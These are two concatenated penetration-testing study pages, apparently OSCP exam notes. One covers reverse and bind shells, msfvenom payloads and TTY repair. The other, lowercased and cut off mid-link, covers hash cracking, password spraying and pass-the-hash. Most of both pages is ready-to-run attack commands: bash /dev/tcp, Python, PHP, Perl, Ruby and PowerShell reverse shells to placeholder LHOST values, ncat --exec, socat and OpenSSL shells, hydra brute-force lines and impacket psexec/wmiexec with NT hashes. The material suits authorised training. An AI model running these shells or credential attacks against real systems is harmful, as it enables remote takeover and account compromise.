# Shells, Payloads and Session Repair [← Stage index](README.md) | [Public-exploit adaptation](../03-initial-access/06-public-exploit-adaptation.md) | [File transfer](01-file-transfer.md) | [Payload obstacles](06-payload-execution-obstacles.md) | [Shell cheatsheet](../../cheatsheets/shells-payloads.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Establish sessions and move files](../../notes/methods/sessions-transfers.md); [Resolve payload execution obstacles](../../notes/methods/execution.md) > **Goal:** turn verified command execution into a session whose execution, transport and interaction properties are understood. Every command is a generic authorized-lab reference, not a target assignment. ## Keep four states separate ```text delivery → execution → connection → usable session ``` | State | Decisive evidence | Does not yet prove | | --- | --- | --- | | Delivery | Exact bytes/request reached intended consumer | Payload executed | | Execution | Harmless command output or controlled side effect | Network callback works | | Connection | Listener records the expected peer | Commands and I/O are usable | | Session | Commands return and host/identity are verified | Higher privilege or stability | Do not change all four layers at once. Preserve the last confirmed state and test the next boundary. ## Choose the access form | Situation | Prefer | Main prerequisite / limitation | | --- | --- | --- | | One bounded action is enough | Direct command execution | Observable output or side effect; no shell required | | Valid credential and remote service | SSH, WinRM or RDP | Authentication plus remote-logon authorization | | Target can reach Kali | Reverse shell | Target egress and a reachable Kali listener | | Kali can reach a target listener | Bind shell | Target can bind and inbound path permits it | | Payload is staged or protocol-aware | Matching framework handler | Handler must use the exact payload/transport | Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell. ## Map the callback before generating anything ```text trigger context → target process/interpreter and architecture → target source interface → route/egress controls → LHOST address visible from target → LPORT → local bind interface → listener/handler ``` Select `LHOST` from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong. On Kali: ```bash ip -brief address ip route ss -lntp ``` Windows source/listener checks: ```powershell Get-NetIPAddress -AddressFamily IPv4 Get-NetRoute -AddressFamily IPv4 Get-NetTCPConnection -State Listen ``` ## Listener baselines and Netcat variants Traditional/OpenBSD-style `nc` commonly used on Kali: ```bash rlwrap nc -lvnp LPORT ``` Nmap Ncat uses a positional listen port; do not mechanically copy every `nc` flag: ```bash ncat -4 -lvn 0.0.0.0 LPORT ``` Verify the bind in another terminal: ```bash ss -lntp | grep ':LPORT' ``` If multiple interfaces exist, bind deliberately: ```bash ncat -4 -lvn LHOST LPORT ``` > **Failure cue:** a listener bound only to `127.0.0.1`, the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind. ## Prove command execution before requesting a shell Linux: ```bash id; hostname; pwd ``` Windows: ```cmd whoami & hostname & cd ``` For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout. ## Linux reverse-shell baselines Choose an interpreter that you confirmed exists. Bash TCP: ```bash bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' ``` Python 3 with a PTY: ```bash python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' ``` Portable FIFO plus Netcat when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f ``` PHP CLI: ```bash php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' ```
Variant — target has Ncat command execution Linux: ```bash ncat LHOST LPORT --exec /bin/sh ``` Windows: ```cmd ncat.exe LHOST LPORT --exec cmd.exe ``` `--exec` exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup.
> **Shell-language cue:** a command injection may execute through `/bin/sh`, which does not understand every Bash construct. Wrap Bash-specific syntax in `bash -c '...'` and then encode it for the outer HTTP/template/database layer. ## Windows session options Prefer an available authenticated service: ```bash evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ssh -p PORT USER@TARGET ``` PowerShell TCP shell when direct command execution is the only primitive: ```powershell $client = [Net.Sockets.TcpClient]::new('LHOST',LPORT) $stream = $client.GetStream() $buffer = New-Object byte[] 65535 while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count) $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> " $bytes = [Text.Encoding]::ASCII.GetBytes($output) $stream.Write($bytes,0,$bytes.Length) $stream.Flush() } $client.Close() ``` > This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it. PowerShell `-EncodedCommand` solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally: ```powershell $command = 'COMMAND' $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) $encoded ``` Invoke in the target command context: ```cmd powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE ``` ## Bind shells Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable. Traditional Netcat with `-e` support on a Linux target: ```bash nc -lvnp PORT -e /bin/sh ``` Connect from Kali: ```bash nc -nv TARGET PORT ``` FIFO alternative when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f ``` Ncat target listener: ```bash ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh ``` > Bind shells expose a target port and may be blocked by the host firewall or upstream ACL. A successful local bind does not prove Kali can reach it. ## Generate payloads after selecting context List rather than guess names and formats: ```bash msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options ``` Stageless command-shell binaries: ```bash msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe ``` Verify the resulting artifacts: ```bash file shell.elf shell.exe sha256sum shell.elf shell.exe ``` > `msfvenom` does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route. ### Staged versus stageless ```text stageless: complete payload delivered at once; larger, usually simpler and more stable staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer ``` Metasploit naming commonly reflects the distinction: ```text windows/x64/shell_reverse_tcp stageless windows/x64/shell/reverse_tcp staged ``` A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs `multi/handler` configured with the exact same payload: ```text msfconsole -q use exploit/multi/handler set payload PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show options run ``` > A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution. ### Existing-PoC payload constraints Only when an existing reviewed PoC documents payload space and bad characters: ```bash msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' \ -s MAX_SPACE ``` Encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list. ## Diagnose quoting and encoding by layer Write the parser chain explicitly: ```text HTTP/SQL/template parser → application language → command launcher (`system`, `cmd /c`, `/bin/sh -c`, PowerShell) → target shell/interpreter → payload command ``` Test each layer with a small command. Encode only for the layer that consumes the characters: ```bash python3 -c 'import urllib.parse; print(urllib.parse.quote("COMMAND"))' ``` Typical failures: - `&`, `|`, `>`, `<`, `$`, backticks, quotes or spaces consumed by an outer shell; - URL decoding occurs zero, one or two times; - JSON, XML, SQL or template quoting changes the command; - PowerShell receives UTF-8 Base64 instead of required UTF-16LE; - payload length exceeds a field, command line or exploit buffer; - 32-bit payload is injected into a 64-bit context or the reverse. ## Diagnose a missing callback in order 1. **Delivery:** prove the request/file/argument reaches the intended consumer. 2. **Execution:** prove `id`/`whoami`, hostname or a bounded side effect in the exact context. 3. **Parser:** verify quoting, encoding, interpreter, working directory and length. 4. **Payload:** confirm OS, architecture, format, staged/stageless type and dependencies. 5. **Listener:** start it first and verify the bound address and port. 6. **Route:** test target-to-listener reachability from the execution context. 7. **Security control:** use concrete errors, quarantine, logs or process behavior. 8. **Session:** repair TTY, buffering, encoding and job control after connection. Target-side route checks where available: ```bash nc -vz LHOST LPORT curl -v --connect-timeout 5 http://LHOST:LPORT/ ``` ```powershell Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed ``` Observe Kali while triggering: ```bash sudo tcpdump -ni any tcp port LPORT ``` Interpretation: | Observation | Next decision | | --- | --- | | No SYN reaches Kali | Wrong execution, LHOST, route, egress or earlier parser layer | | SYN arrives; no listener response | Wrong bind/interface/port or local firewall | | TCP handshake then immediate close | Payload/handler mismatch, crash or security control | | Connection stays but no commands | Staged/raw mismatch, buffering or I/O/session issue | ## Handle security-control evidence proportionately Windows Defender status, when the current identity can query it: ```powershell Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled ``` Do not label every failure “AV.” Differentiate: - file never arrived or hashes differ; - file arrived and disappeared/quarantined; - process creation was denied; - script content was blocked; - process started and exited/crashed; - callback was blocked after execution; - application-control or language-mode restrictions; - ordinary format, architecture, permission or dependency errors. Prefer an already available native or authenticated route when it satisfies the objective. Encoding is transport representation, not proof of evasion. Custom shellcode development and deep AV-bypass work are outside this unit. For MOTW/Office/Library-file delivery, execution-policy precedence, AMSI/AppLocker/Defender evidence and restricted Metasploit module/session handling, continue with [payload execution obstacles](06-payload-execution-obstacles.md). ## Stabilize a Linux TTY First obtain a PTY with an available interpreter: ```bash python3 -c 'import pty; pty.spawn("/bin/bash")' ``` Press `Ctrl-Z` locally, then: ```bash stty raw -echo; fg ``` Back in the remote shell: ```bash reset export TERM=xterm-256color stty rows 40 columns 120 ``` If the local terminal becomes unreadable, restore it from a separate/local shell: ```bash stty sane ``` Socat can provide a stronger PTY when present on both sides: ```bash # Kali socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr # Target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT ``` > TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one. ## Verify every new session Linux: ```bash hostname; id; pwd ip addr; ip route ss -lntup ``` Windows: ```cmd hostname whoami /all cd ipconfig /all route print netstat -ano ``` Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state. ## Failure router | Symptom | Interpretation / next action | | --- | --- | | Direct command fails | Repair exploit/request/parser before payload work | | Direct command succeeds, no SYN | Correct payload, LHOST, interpreter or egress | | Listener absent/wrong bind | Bind before trigger and verify with `ss` | | Connection to raw listener, no I/O | Check staged payload or buffering | | Immediate disconnect | Check process crash, handler/payload match and exit behavior | | Shell lacks job control | Spawn PTY and repair local terminal state | | Arrow keys/control characters break | Correct PTY, raw mode and `TERM` | | Windows shell output is garbled | Check code page/encoding and payload channel | | File vanishes after transfer | Gather quarantine/security-control evidence | | Works once, not again | Check single-use listener, service crash, cleanup and trigger state | ## Exam boundary The current OSCP+ guide permits `msfvenom` and `exploit/multi/handler` against all targets, but Meterpreter and Metasploit Auxiliary/Exploit/Post modules become locked to one selected target. Metasploit pivoting is prohibited. AI chatbots are prohibited during the actual exam. Recheck the current guide before a mock or exam. ## Powercat — Windows PowerShell shell transport Use when a reviewed powercat.ps1 is available and the current PowerShell context permits it. Keep the listener and target connection direction explicit. ```bash # Attacker: listener nc -lvnp LPORT ``` ```powershell # Target: load the local reviewed script and connect back . .\powercat.ps1 powercat -c LHOST -p LPORT -e cmd.exe ``` Read: a connection is not yet an identity proof; run hostname/whoami in the resulting channel. Script-policy/AV/runtime failures → use the existing native transfer and shell alternatives. Powercat does not repair a missing callback route. Sources: [upstream 1](https://github.com/besimorhino/powercat). ## Penelope or pwncat-cs — handle an existing shell and move files Choose one handler when its basic session/transfer features fit your platform. pwncat-cs assumes Linux unless configured otherwise; these are not interchangeable names for every similarly named pwncat project. ```bash # Basic reverse-shell listener with pwncat-cs pwncat-cs -lp LPORT # Alternative: open Penelope's current CLI help, then select its listener port penelope --help penelope -p LPORT ``` In pwncat-cs's local prompt, use only the operation needed: ```text download /REMOTE/FILE ./LOCAL_FILE upload ./LOCAL_FILE /REMOTE/FILE back ``` For Penelope, F12 detaches a PTY session to its menu; `interact SESSION_ID` returns to it. Verify uploaded bytes and the target identity after reconnecting. Optional modules can fetch/run additional tools or exploitation features; they are separate actions and are not part of this basic handler workflow. Sources: [upstream 1](https://github.com/brightio/penelope) · [upstream 2](https://github.com/calebstewart/pwncat). ## Keep listeners and long-running checks in tmux Use on your own attack workstation to retain a working listener or pspy view while switching terminals. A tmux pane is not a second target shell unless you create/connect one. ```bash tmux new-session -s oscp tmux list-sessions tmux attach-session -t oscp # Capture existing pane history from another terminal; not a full session recorder tmux capture-pane -p -S - -t oscp:0.0 > pane-history.txt ``` Within tmux: Ctrl-b then d detaches; Ctrl-b then c creates a window; Ctrl-b then w selects one. Read: scrollback capture only contains retained history. Continue saving raw scanner/tool output and proof explicitly rather than relying on terminal history alone. Sources: [upstream 1](https://github.com/tmux/tmux/blob/master/tmux.1). ## ASPX handler check before generating a Windows payload Use only when you can place a file at a path served by an ASP.NET handler. A static upload on IIS, classic ASP, PHP or ASP.NET Core does not automatically execute ASPX pages. ```aspx <%@ Page Language="C#" %> <% Response.Write(System.Security.Principal.WindowsIdentity.GetCurrent().Name); %> ``` Save as a uniquely named test ASPX file, upload through the verified write primitive, then request its actual stored URL: ```bash curl -i http://TARGET:PORT/ACTUAL_PATH/probe.aspx ``` Read: the process identity, rather than literal source or a file download, verifies server-side handling. Then use the matching ASPX/Windows payload generation already covered here, with the correct runtime/architecture and return route. Delete the test artifact after validation. Sources: [upstream 1](https://learn.microsoft.com/en-us/previous-versions/aspnet/k33801s3(v=vs.100)). ## Shell alternatives when the installed runtime changes Choose one matching the actual target runtime and a reachable listener. These alternatives retain the current execution identity; they do not create privilege by themselves. ```bash # Attacker nc -lvnp LPORT # Target: BusyBox build with the optional nc -e feature busybox nc -e /bin/sh LHOST LPORT # Target: Perl with Socket support perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"<&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");' # Target: Ruby with its socket library ruby -rsocket -e 's=TCPSocket.new("LHOST",LPORT);exec("/bin/sh","-i",in:s,out:s,err:s)' ``` Read: check hostname/id after connecting, then use the existing PTY stabilization steps. Missing runtime, unsupported BusyBox options or a blocked return path → choose a supported transport instead of repeatedly changing the shell command. A noninteractive process can execute correctly while lacking a terminal. Sources: [upstream 1](https://busybox.net/downloads/BusyBox.html) · [upstream 2](https://perldoc.perl.org/Socket) · [upstream 3](https://docs.ruby-lang.org/en/master/Kernel.html#method-i-exec). ## OpenSSL transport when a TLS callback is useful Use when OpenSSL exists on both ends and the actual route permits the chosen listener. TLS is a transport choice, not a fix for an unreachable destination. ```bash # Attacker: create a short-lived local test certificate, then listen openssl req -x509 -newkey rsa:2048 -nodes -days 1 \ -subj '/CN=listener' -keyout listener.key -out listener.crt openssl s_server -quiet -accept LPORT -cert listener.crt -key listener.key # Target: connect a shell through the FIFO and TLS client mkfifo /tmp/shell-pipe /bin/sh -i < /tmp/shell-pipe 2>&1 | \ openssl s_client -quiet -connect LHOST:LPORT > /tmp/shell-pipe ``` Read: verify the session identity and preserve the working channel. This example does not authenticate the listener certificate. A TLS handshake failure, a refused socket and a missing shell are different failures. Use a unique writable FIFO path and remove the test pipe after the session. Sources: [upstream 1](https://docs.openssl.org/master/man1/openssl-s_server/) · [upstream 2](https://docs.openssl.org/master/man1/openssl-s_client/). ## Sources - Supplied PEN-200 pp257-259, Ch 13-14 pp375-415, Ch 15 pp416-441 selectively, Ch 19 PTY examples and Ch 21.2 pp671-683 - [Current OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [Current OSCP+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) - [Metasploit msfvenom documentation](https://github.com/rapid7/metasploit-framework/blob/master/docs/metasploit-framework.wiki/How-to-use-msfvenom.md) - [Ncat basic usage](https://nmap.org/ncat/guide/ncat-usage.html) and [command execution](https://nmap.org/ncat/guide/ncat-exec.html) - [PowerShell command-line documentation](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1) - [Microsoft Defender `Get-MpComputerStatus`](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2025-ps) - [getSH Useful Stuff and Tool Cheatsheet](https://lizajose.github.io/getSH/useful-stuff), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98)

# credential classification, cracking and reuse [← stage index](readme.md) | [credential cheatsheet](../../cheatsheets/credentials-cracking.md) | [ad procedures](../06-ad-lateral-movement/readme.md) | [strategy map](../../notes/attack_strategy_map.md) | study methods: [recover and use authentication material](../../notes/methods/credentials.md); [gain a more useful domain identity](../../notes/methods/ad-identities.md) > **purpose:** distinguish authentication material, estimate whether offline recovery is worthwhile, and test only compatible, evidence-backed uses. actual credentials belong in private records. ## credential record ```text source -> material/format -> local/domain/application identity -> possible use -> service/protocol -> authentication -> authorization -> new access -> re-enumeration ``` record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together. ## classify before acting | material | recognition | compatible use | | --- | --- | --- | | cleartext password | text tied to an identity/source | normal protocol/application login | | ssh private key | openssh/pem private-key block | ssh public-key authentication; recover passphrase offline if protected | | linux password record | `user:$id$salt$digest:...` | offline recovery with complete record/format | | application/file verifier | tool-specific `$...$` or documented digest | offline recovery with matching mode/parser | | nt hash | usually 32 hex from sam/lsass/ntds context | offline recovery; pth where ntlm and the client support it | | net-ntlmv2 response | `user::domain:challenge:proof:blob` | offline recovery or live relay under specific conditions; not pth material | | dcc2/mscache v2 | username-dependent cached-domain verifier | offline recovery; not ordinary pth material | | kerberos ticket | `.kirbi`, ccache or in-memory cache | ticket-specific access subject to realm, spn, validity, clock and route | | kerberos roast material | `$krb5asrep$...` or `$krb5tgs$...` | offline recovery with matching enctype/mode | | session/api token | cookie, bearer/jwt or application token | issuing application and authorization context only | do not feed unknown strings into random modes. preserve the source and identity context, then identify the format: ```bash hashid hash_or_file john --list=formats | grep -i keyword hashcat -hh | grep -i keyword hashcat --example-hashes | less ``` > **failure cue:** `no hashes loaded`, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password. ## validate one known password use the normal client for the observed service: ```bash ssh -o preferredauthentications=password -p port user@target nxc smb target -d domain -u user -p 'password' --shares evil-winrm -i target -u user -p 'password' xfreerdp /v:target /u:'domain\user' /p:'password' /cert:ignore ``` local windows account: ```bash nxc smb target --local-auth -u user -p 'password' --shares ``` > **decisive output:** the destination service accepts the intended identity. share, session or action access is a separate authorization result.
variant — known user, targeted password dictionary ```bash hydra -l user -p wordlist -s port -t 4 -f ssh://target hydra -l user -p wordlist -t 1 -f rdp://target ``` use only on an assigned target after checking lockout and rate controls. confirm every reported success with the normal client.
variant — one password across an authorized user list ```bash hydra -l users -p 'password' -s port -t 1 rdp://target nxc smb target -d domain -u users -p 'password' --continue-on-success ``` one attempt per account can still trigger lockout or monitoring. establish scope, threshold/window and observation period first.
variant — http post form capture a correct request and stable failure marker with burp: ```bash hydra -l user -p wordlist target http-post-form \ '/login_path:username=^user^&password=^pass^:f=stable_failure_text' ``` dynamic csrf tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. a weak failure marker creates false positives.
runascs — test a known password from an existing windows shell use a reviewed, compatible build on the current windows host with a known plaintext password. this creates a new local process/logon context; it is not remote execution and does not turn an nt hash into a password. ```cmd rem domain account: verify the new process token runascs.exe user password "cmd /c whoami /all" -d domain rem local account: omit the domain switch for the current host's account runascs.exe user password "cmd /c whoami /all" rem network-only credentials: local identity stays unchanged runascs.exe user password "cmd /c dir \\target\share" -d domain -l 9 ``` > **read:** in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. with logon type 9, local whoami is not a credential test: use the remote operation's result. logon failure → check account scope, password and permitted logon type. an accepted logon with access denied → inspect authorization on that resource. [runascs upstream](https://github.com/antoniococo/runascs). native runas remains an alternative when an interactive password prompt is usable. neither tool guarantees an elevated token.
## estimate feasibility ```bash hashcat -b -m mode python3 -c "print((charset_size ** length) / guesses_per_second)" ``` use the actual mode and hardware rate. salts prevent reusable precomputation; iterations and memory-hard kdfs reduce guesses per second. prefer candidates in this order: ```text exact recovered/default candidates -> organization/user/product words -> observed policy and mutations -> small dictionary plus rules -> known mask/hybrid -> broader curated lists/rules -> exhaustive search only when its measured cost is defensible ``` preview mutations before spending the candidate budget: ```bash hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50 john --wordlist=wordlist.txt --rules=jumbo --stdout | head -n 50 ``` ## hashcat baseline and meaningful modes ```bash hashcat -a 0 -m mode hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job hashcat -m mode hashes.txt --show ``` > `-a 0` is dictionary mode. do not use `-a 3` with a wordlist; attack mode 3 expects a mask. common source examples identify ntlm as mode `1000`, net-ntlmv2 as `5600` and keepass as `13400`, but confirm against the installed version: ```bash hashcat -h | grep -ei 'ntlm|netntlmv2|keepass|openssh' ```
mask and session variants ```bash hashcat -m mode hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask hashcat --session targeted-mask --restore ``` > mask order is a hypothesis about structure. estimate its keyspace before committing time.
hybrid variant — base word plus three digits ```bash hashcat -a 6 -m mode hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid ``` use only when evidence supports both the base words and suffix shape.
## john the ripper workflow ```bash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt ``` ```bash john --format=format --wordlist=wordlist.txt --rules=jumbo hash.txt john --session=crack-job --wordlist=wordlist.txt hash.txt john --restore=crack-job ``` file-to-hash converters: ```bash zip2john archive.zip > archive.hash 7z2john archive.7z > archive.hash ssh2john id_rsa > ssh.hash keepass2john vault.kdbx > keepass.hash pdf2john document.pdf > pdf.hash office2john document.docx > office.hash rar2john archive.rar > rar.hash unshadow passwd.copy shadow.copy > linux.hash ``` converter availability varies by package/path; locate it rather than assuming: ```bash command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null ``` > preserve the complete converter output. some formats include a filename label before `:` that john accepts but hashcat may require removed from a separate tool-specific copy. ## keepass database ```bash keepass2john vault.kdbx > keepass.hash john --wordlist=wordlist.txt keepass.hash john --show keepass.hash ``` hashcat alternative after confirming kdbx/kdf and input format: ```bash hashcat -hh | grep -i keepass hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule hashcat -m 13400 keepass.hash --show ``` > mode `13400` covers common keepass 1/2 aes formats. installed help and example hashes decide for the actual file. a recovered master password still requires opening and validating the vault. ## ssh private-key passphrase ```bash ssh2john id_rsa > ssh.hash john --wordlist=wordlist.txt ssh.hash john --show ssh.hash chmod 600 id_rsa ssh-keygen -y -f id_rsa > derived.pub ssh -vv -i id_rsa -o identitiesonly=yes -p port user@target ``` > cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. `permission denied (publickey)` can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.
hashcat variant — only for a supported openssh format ```bash hashcat -hh | grep -i 'openssh\|private key' hashcat -a 0 -m mode ssh.hash wordlist.txt -r rule_file ``` choose `mode` from the complete `$sshng$...` structure and installed help. token-length or unsupported-cipher errors require a compatible parser/tool, not `--force` with a wrong mode.
## linux password records ```bash unshadow passwd.copy shadow.copy > linux.hash john --wordlist=wordlist.txt --rules=jumbo linux.hash john --show linux.hash ``` > preserve username, uid, shell and lock markers. a recovered password does not override ssh settings, `su` policy or a disabled account. ## nt hash offline recovery: ```bash hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule john --format=nt --wordlist=wordlist.txt nt.hash ``` compatible smb validation: ```bash nxc smb target -d domain -u user -h nt_hash --shares smbclient //target/share -u 'domain\user' --pw-nt-hash nt_hash ``` > nt hashes come from a producing context such as sam, lsass or ntds. a visually similar 32-hex application digest is not pth material.
variant — remote access/execution when the identity has matching rights ```bash impacket-wmiexec -hashes :nt_hash 'domain/user@target' impacket-psexec -hashes :nt_hash 'domain/user@target' xfreerdp /v:target /u:'domain\user' /pth:nt_hash /cert:ignore ``` wmi needs administrative rights plus dcom/rpc/smb reachability and normally runs as the authenticated user. psexec-style execution needs service-control and writable-share rights and commonly yields system. rdp hash authentication depends on target/client support and policy. detailed method selection belongs to the lateral-movement procedure.
## net-ntlmv2 response ```bash hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash ``` > a net-ntlmv2 response is not an nt hash and cannot be supplied to `-h` or `-hashes`. relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights. the oscp+ exam prohibits spoofing, including nbns. do not use responder poisoning on the exam. keep capture/relay work to explicitly authorized labs and recheck the current guide. ## dcc2 / cached domain logon ```bash hashcat -hh | grep -i 'domain cached' john --format=mscash2 --wordlist=wordlist.txt dcc2.hash ``` > preserve the username because it participates in the verifier. dcc2 is an offline recovery target, not ordinary pth material. ## kerberos tickets and caches inspect before use: ```bash klist krb5ccname=ticket.ccache klist impacket-ticketconverter ticket.kirbi ticket.ccache ``` compatible client example: ```bash export krb5ccname=ticket.ccache impacket-wmiexec -k -no-pass 'domain/user@host.domain' ``` > verify client principal, realm, tgt versus service ticket, spn, start/end time, clock, dns/fqdn and routes. a readable cache does not prove authorization. roasting, forging and detailed ptt/overpass belong to the ad procedures. ## credential guard boundary ```powershell get-computerinfo | select-object deviceguardsecurityservicesconfigured,deviceguardsecurityservicesrunning ``` credential guard can isolate reusable domain secrets from ordinary lsass memory. it does not erase local sam, file, vault, dpapi, ticket, service-configuration or directory-right paths. one failed dump method disproves only that method and context. intrusive ssp interception changes system state and waits for a future logon; it is not the default block 5 response. ## failure routing | failure | interpretation / next action | | --- | --- | | timeout/no route | fix source position, pivot or service reachability before judging the credential | | wrong tls/protocol response | reconfirm application and required transport | | local/domain/upn mismatch | retry only an evidence-backed identity form | | account disabled/locked/expired/restricted | stop guessing; preserve possible credential validity and record state | | password/public-key/ntlm/kerberos method rejected | choose material/client compatible with server policy | | authentication succeeds, requested action fails | credential is valid; enumerate authorization and another relevant service | | hash parser rejects input | recheck complete line, prefix, converter, mode and version | | key unlocks but ssh rejects it | recheck user, server, authorized-key state and algorithm policy | | ticket loads but service rejects it | check expiry, spn, realm, clock, dns and service authorization | | pth login succeeds but execution fails | check admin rights, uac remote restrictions and method-specific ports/rights | ## re-enumerate after success ```text accepted identity -> groups/roles -> reachable services -> shares/files -> authenticated application behavior -> accessible hosts/routes -> new credentials/tickets/sessions -> privilege and movement handoffs ``` verify destination host, accepted identity and actual read/write/execute rights. new hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter ad mapping. ## build a small site-specific wordlist with cewl use when observed organization, product or account vocabulary could improve an offline recovery attempt. keep the crawl on the assigned site. ```bash # bounded crawl: depth 1, words of at least five characters cewl -d 1 -m 5 --lowercase -w site-words.txt http://target:port/ # review before using it in the existing format-specific recovery command head -n 30 site-words.txt wc -l site-words.txt ``` read: useful vocabulary is a candidate list, not a recovered password. an authenticated or js-only page may expose little to the crawler. use the already identified hashcat/john format, then apply a small relevant rule/mask rather than immediately creating an enormous list. sources: [upstream 1](https://github.com/digininja/cewl). ## generate usernames from observed naming conventions use when you have names and at least one real account/email that reveals a likely format. put only relevant names in names.txt. ```bash # review supported format names in this installed version ./username-anarchy --list-formats # restrict output to plausible formats rather than every permutation ./username-anarchy -i names.txt -f first,first.last,flast,f.last > users.txt sort -u users.txt -o users.txt ``` read: these are candidates. confirm names with authorized directory/user enumeration; an email local part is not automatically a domain account. keep domain, local-machine and application namespaces distinct. use kerbrute's username probe only when the kdc path and domain are known. sources: [upstream 1](https://github.com/urbanadventurer/username-anarchy). ## targeted candidates — crunch, cupp and rules use a mask/profile only when evidence justifies it. this example expands a known six-character stem with three digits; it creates 1,000 candidates. ```bash crunch 9 9 -t 'foobar%%%' -o stem-digits.txt # interactive profile-based alternative, when relevant clues exist python3 cupp.py -i # preview a rule expansion before choosing the recovery job hashcat --stdout site-words.txt -r /usr/share/hashcat/rules/best64.rule | head -n 40 ``` read: calculate candidate count and use the matching offline format. cupp asks questions; invented personal details do not improve the list. a three-digit suffix or a rule is a hypothesis, not a reason to spray every generated value at an online login. sources: [upstream 1](https://www.kali.org/tools/crunch/) · [upstream 2](https://github.com/mebus/cupp) · [upstream 3](https://hashcat.net/wiki/). ## password-protected zip — direct test or extracted verifier use when the artifact is an encrypted zip and its encryption is supported by the selected tool. ```bash # dictionary attack; -u checks candidates by attempting extraction fcrackzip -u -d -p wordlist archive.zip # alternative: extract a verifier for john, preserving the original archive zip2john archive.zip > archive.hash john --wordlist=wordlist archive.hash john --show archive.hash ``` read: confirm a candidate by opening/extracting the intended file. an unsupported encryption type or empty verifier is a format/tool issue, not proof that the password is unguessable. reuse the recovered value only after identifying its account/service context. sources: [upstream 1](https://www.kali.org/tools/fcrackzip/) · [upstream 